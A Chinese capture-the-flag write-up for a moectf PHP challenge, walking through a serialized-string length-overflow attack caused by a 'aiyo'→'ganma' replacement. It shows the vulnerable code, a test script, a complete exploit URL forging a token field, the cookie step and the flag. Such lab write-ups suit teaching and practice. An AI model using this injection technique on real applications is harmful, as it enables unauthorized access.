# baby_unserialize

可恶，这里也有黑子。

一道反序列化题。不过之前没见过类似考点的php反序列化，还好搜到了[答案](https://xiaolong22333.top/index.php/archives/14/)，考点完全一致。

```php
<?php
session_start();
highlight_file(__FILE__);

class moectf{
    public $a;
    public $b;
    public $token='heizi';
    public function __construct($r,$s){
        $this->a = $r;
        $this->b = $s;
    }
}

$r = $_GET['r'];
$s = $_GET['s'];

if(isset($r) && isset($s) ){
    $moe = new moectf($r,$s);
    $emo = str_replace('aiyo', 'ganma', serialize($moe));
    $_SESSION['moe']=base64_encode($emo);

}

'a.php';
```

我之前直接被卡在这里，反序列化漏洞没有unserialize怎么搞？后来发现末尾的a.php不是打错了，是有这样一个文件，里面就是我们要找的unserialize函数。

```php
<?php
session_start();
highlight_file(__FILE__);

include('flag.php');

class moectf{
    public $a;
    public $b;
    public $token='heizi';
    public function __construct($r,$s){
        $this->a = $r;
        $this->b = $s;
    }
}

if($_COOKIE['moe'] == 1){
    $moe = unserialize(base64_decode($_SESSION['moe']));
    if($moe->token=='baizi'){
        echo $flag;
    }
}
```

看session还以为是seesion反序列化漏洞，但是没有解释引擎的差别没法利用。这题做法和上面提到的那篇博客完全一致。第一个文件将序列化后的字符串（这个序列化后很重要）中aiyo替换成ganma，发现替换后的字符串比原先多了一个。出现了个什么问题呢？序列化字符串对被序列化的类中的字段长度有规定，比如s:114要求后面的字符串只能有114的长度，可是你替换了不就变长了吗？故替换后是无法被反序列化的。

php在反序列化时，底层代码是以;作为字段的分隔，以}作为结尾，并且是根据长度判断内容。拿出sql注入一样的思路，我们自己伪造;和}来闭合，构造一个假的序列化字符串。可以做个实验。

```php
<?php
class moectf{
    public $a;
    public $b;
    public $token='heizi';
    public function __construct($r,$s){
        $this->a = $r;
        $this->b = $s;
    }
}
$test=new moectf('c','aiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyo";s:5:"token";s:5:"baizi";}');
$moe=serialize($test);
$emo = str_replace('aiyo', 'ganma', serialize($moe));
var_dump(unserialize($emo));
?>
```

aiyo每替换一次，都会造成长度1的溢出。我们要伪造剩下的";s:5:"token";s:5:"baizi";}部分，故需要填写27个aiyo。一个aiyo是s:4:"aiyo"，替换后是s:4:"ganma"。长度不一致，所以只有ganm会保留，a溢出。a不是有效的格式化字符串，反序列化失败。如果我们这样，多来几个aiyo，同时保证溢出的内容有效，不就可以自己随意替换后面的值了吗？就算后面真正的token不会被删除，php也只会反序列化}部分，自动忽略后面。故上面的例子是可以反邪话成功的。因此这就是我们的payload了。

- http://43.138.48.124:12345/?r=a&s=aiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyo%22;s:5:%22token%22;s:5:%22baizi%22;}

别忘了还有cookie。chrome里面去cookie处自己新建一个名为moe值为1的cookie后进入a.php即可看见flag。

- ### Flag
  > moe{Her3_1s_Y0ur_fl4g}